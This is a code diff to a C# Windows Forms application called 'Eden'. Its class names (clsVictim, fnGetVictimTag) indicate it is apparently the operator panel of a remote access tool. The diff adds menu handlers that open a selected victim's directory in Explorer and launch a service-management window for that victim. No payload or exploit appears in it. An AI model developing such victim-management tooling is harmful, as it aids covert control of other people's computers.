@@ -1,3 +1,4 @@
+using System.Diagnostics;
 using System.Reflection.Metadata.Ecma335;
 using System.Text.Json;
 
@@ -116,7 +117,7 @@ namespace Eden
                     {
                         Invoke(new Action(() =>
                         {
-                            ListViewItem item = listView1.FindItemWithText(aMsg[2]);
+                            ListViewItem? item = listView1.FindItemWithText(aMsg[2]);
                             if (item != null)
                                 listView1.Items.Remove(item);
                         }));
@@ -282,12 +283,43 @@ namespace Eden
 
         private void toolStripMenuItem4_Click(object sender, EventArgs e)
         {
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                clsVictim victim = clsTools.fnGetVictimTag(item);
+                if (victim == null)
+                    continue;
 
+                Process.Start(new ProcessStartInfo()
+                {
+                    FileName = "explorer.exe",
+                    Arguments = victim.m_szDirectory,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                });
+            }
         }
 
         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
         {
             timer1.Stop();
+        }
+
+        private void toolStripMenuItem8_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                clsVictim victim = clsTools.fnGetVictimTag(item);
+                frmService? f = clsTools.FindForm<frmService>(victim);
+                if (f == null)
+                {
+                    f = new frmService(victim);
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
+            }
         }
     }
 }
